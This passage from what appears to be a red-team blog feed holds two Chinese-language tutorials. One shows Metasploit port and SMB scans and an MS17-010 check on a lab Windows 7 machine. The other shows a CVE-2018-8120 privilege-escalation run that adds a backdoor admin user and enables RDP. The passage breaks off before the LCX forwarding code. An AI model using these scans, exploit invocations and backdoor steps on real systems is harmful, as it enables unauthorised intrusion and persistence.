        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1298933709&auto=1&height=66"></iframe><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote><p>ACK : 通过ACK扫描的方式对防火墙上未屏蔽的端口进行探测</p></blockquote><blockquote><p>ftpbounce：通过FTPbounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能够很好的防范FTPbounce攻击，但在一些旧的Solaris及FreeBSD系统的FTP服务中此类工具方法仍能够被利用</p></blockquote><blockquote><p>syn：使用发送TCP SYN标志的方式探测开放的端口</p></blockquote><blockquote><p>tcp：通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度较慢</p></blockquote><blockquote><p>xmas：一种更为隐秘的扫描方式，通过发送FIN,PSH,和URG标志，能够躲避一些高级的TCP标记检测器的过滤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp //TCP端⼝扫描</span><br><span class="line">auxiliary/scanner/portscan/ack //ACK防⽕墙扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce //FTP跳端⼝扫描</span><br><span class="line">auxiliary/scanner/portscan/syn //SYN端⼝扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas //TCP-XMas端⼝扫描</span><br></pre></td></tr></table></figure><blockquote><p>auxiliary/scanner/portscan/tcp //TCP端⼝扫描</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/391.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting     Required  Description</span><br><span class="line">   ----         ---------------     --------  -----------</span><br><span class="line">   CONCURRENCY  10                  yes       The number of concurrent ports to check per host</span><br><span class="line">   DELAY        0                   yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   JITTER       0                   yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS        1-10000             yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS       192.168.119.139     yes       The target address range or CIDR identifier</span><br><span class="line">   THREADS      100                 yes       The number of concurrent threads</span><br><span class="line">   TIMEOUT      1000                yes       The socket connect timeout in milliseconds</span><br></pre></td></tr></table></figure><p>扫描结束！<code>192.168.119.139</code>开放了以下端口：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/392.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.119.139:      - 192.168.119.139:80 - TCP OPEN</span><br><span class="line">[+] 192.168.119.139:      - 192.168.119.139:135 - TCP OPEN</span><br><span class="line">[+] 192.168.119.139:      - 192.168.119.139:139 - TCP OPEN</span><br><span class="line">[+] 192.168.119.139:      - 192.168.119.139:445 - TCP OPEN</span><br><span class="line">[+] 192.168.119.139:      - 192.168.119.139:5357 - TCP OPEN</span><br><span class="line">[*] 192.168.119.139:      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>auxiliary/scanner/portscan/ack //ACK防⽕墙扫描</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/396.png" alt="图片"></p><p>用<code>ACK</code>扫描会分段去发送数据包扫描，才能够绕过一些防火墙设备，而不是Windows防火墙！Windows自带的防火墙是阻断一切进入的连接!</p><p>因为虚拟机<code>Windwos 7</code>是吧防火墙关闭了的，如果打开那么防火墙是会阻断连接的！</p><p>经过测试，Windows防火墙开启，使用<code>ACK</code>是扫描不出来的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/395.png" alt="图片"></p><p>剩余几个端口扫描，和上面的例子是一样的用法，只是模式不同！</p><h2 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h2><blockquote><p>use auxiliary/scanner/smb/smb_version //探测对方操作系统信息</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/393.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/394.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.119.139:445   - Host is running Windows 7 Ultimate SP1 (build:7601) (name:LIUWX-PC) (workgroup:WORKGROUP )</span><br><span class="line">[*] 192.168.119.139:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，操作系统是<code>Windows 7</code>,主机名是:<code>LIUWX-PC</code>,不在域内！</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><blockquote><p>MS-17-010 //永恒之蓝</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.119.139</span><br><span class="line">rhosts =&gt; 192.168.119.139</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS       192.168.119.139                                                 yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                                      no        The password for the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/397.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.119.139:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.119.139:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Host is likely VULNERABLE to MS17-010!</p><p>说明是存在永恒之蓝这个漏洞的！</p><p>存在的话，就可以利用：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/399.png" alt="图片"></p><p>可以看到，虚拟机<code>Win7</code>已经蓝屏！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/398.png" alt="图片"></p><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>我首先是在<code>/root</code>目录下建立了一个<code>ips.txt</code>文本，里面是我要扫描的<code>IP</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/400.png" alt="图片"></p><p>一般正常的设置<code>RHOSTS</code>就是:</p><blockquote><p>set rhosts 192.168.119.139</p></blockquote><p>因为我们刚刚创建了个<code>ips.txt</code>,那么就可以这样设置：</p><blockquote><p>set rhosts file:/root/ips.txt</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/401.png" alt="图片"></p><p>这样的话就会非常方便!</p><p>具体就<code>auxiliary</code>到此为止!</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之端口转发</title>
      <link href="/2019/10/08/red-hack-3/"/>
      <url>/2019/10/08/red-hack-3/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=491577283&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>exploit利用成功之后，想要登陆目标，或者连接目标的某些端口，比如1344端口无法直接连接，我们就可以吧目标的端口转发到公网</p></blockquote><h2 id="常用案例"><a href="#常用案例" class="headerlink" title="常用案例"></a>常用案例</h2><p>连接目标远程桌面服务：有时候，目标的服务器在内网，我们没有办法连接，也是吧端口转发出来，就可以进行连接了</p><p>…等等</p><h2 id="涉及工具"><a href="#涉及工具" class="headerlink" title="涉及工具"></a>涉及工具</h2><ul><li>VPS</li><li>转发工具</li><li>LCX</li><li><a href="https://github.com/tennc/webshell">NATbypass</a></li></ul><h2 id="创建hack用户"><a href="#创建hack用户" class="headerlink" title="创建hack用户"></a>创建hack用户</h2><p>这边是创建了一个<code>hack</code>的用户，并且提升到了管理员组</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/378.png" alt="图片"></p><h2 id="查看是否开放了3389"><a href="#查看是否开放了3389" class="headerlink" title="查看是否开放了3389"></a>查看是否开放了3389</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; netstat -anto</span><br><span class="line"></span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态           PID      卸载状态</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4InHost      </span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       736InHost      </span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4InHost      </span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       420InHost      </span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       832InHost      </span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       932InHost      </span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       524InHost      </span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       980InHost      </span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       532InHost      </span><br><span class="line">  TCP    127.0.0.1:8183         0.0.0.0:0              LISTENING       1300InHost      </span><br><span class="line">  TCP    192.168.1.103:80       192.168.1.100:57912    ESTABLISHED     4InHost      </span><br><span class="line">  TCP    192.168.1.103:139      0.0.0.0:0              LISTENING       4InHost      </span><br><span class="line">  TCP    [::]:80                [::]:0                 LISTENING       4InHost      </span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       736InHost      </span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4InHost      </span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       420InHost      </span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       832InHost      </span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       932InHost      </span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       524InHost      </span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       980InHost      </span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       532InHost      </span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    932            </span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    932            </span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    276            </span><br><span class="line">  UDP    192.168.1.103:137      *:*                                    4            </span><br><span class="line">  UDP    192.168.1.103:138      *:*                                    4            </span><br><span class="line">  UDP    [::]:500               *:*                                    932            </span><br><span class="line">  UDP    [::]:4500              *:*                                    932            </span><br><span class="line">  UDP    [::]:5355              *:*                                    276         </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/379.png" alt="图片"></p><p>可以看到，<code>3389</code>端口是没有开放的</p><p>开启<code>win7</code>的<code>3389</code>命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; CVE-2018-8120.exe &quot;REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&quot;</span><br><span class="line"></span><br><span class="line">CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)</span><br><span class="line">[-] Could not load ntkrnlmp.exe , load ntoskrnl.exe instead.</span><br><span class="line">[+] Trying to execute REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f as SYSTEM...</span><br><span class="line">[+] Process created with pid 3324!</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; netstat -anot</span><br><span class="line"></span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态           PID      卸载状态</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4InHost      </span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       772InHost      </span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4InHost      </span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1076InHost      </span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       424InHost      </span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       836InHost      </span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       940InHost      </span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       524InHost      </span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       640InHost      </span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       548InHost      </span><br><span class="line">  TCP    127.0.0.1:8183         0.0.0.0:0              LISTENING       1336InHost      </span><br><span class="line">  TCP    192.168.1.103:80       192.168.1.100:58518    ESTABLISHED     4InHost      </span><br><span class="line">  TCP    192.168.1.103:139      0.0.0.0:0              LISTENING       4InHost      </span><br><span class="line">  TCP    [::]:80                [::]:0                 LISTENING       4InHost      </span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       772InHost      </span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4InHost      </span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       1076InHost      </span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       424InHost      </span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       836InHost      </span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       940InHost      </span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       524InHost      </span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       640InHost      </span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       548InHost      </span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    940            </span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    940            </span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    1076            </span><br><span class="line">  UDP    192.168.1.103:137      *:*                                    4            </span><br><span class="line">  UDP    192.168.1.103:138      *:*                                    4            </span><br><span class="line">  UDP    [::]:500               *:*                                    940            </span><br><span class="line">  UDP    [::]:4500              *:*                                    940            </span><br><span class="line">  UDP    [::]:5355              *:*                                    1076            </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为中间是有空格的，所以在空格前面加一个\&quot;,所以就是</span><br><span class="line"></span><br><span class="line">CVE-2018-8120.exe &quot;REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/380.png" alt="图片"></p><p>这边已经打开了<code>3389</code>了</p><h2 id="登陆远程桌面"><a href="#登陆远程桌面" class="headerlink" title="登陆远程桌面"></a>登陆远程桌面</h2><blockquote><p>mstsc //登陆远程桌面</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/381.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/382.png" alt="图片"></p><p>可以看到是登陆成功的</p><p>有的时候，虽然说它是开了<code>3389</code>，但是只能是内网登陆，外网是无法登陆的，所以只能通过<code>端口转发</code>!</p><h2 id="安装LCX"><a href="#安装LCX" class="headerlink" title="安装LCX"></a>安装LCX</h2><p>可以先用<code>gcc</code>编译一个lcx：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span 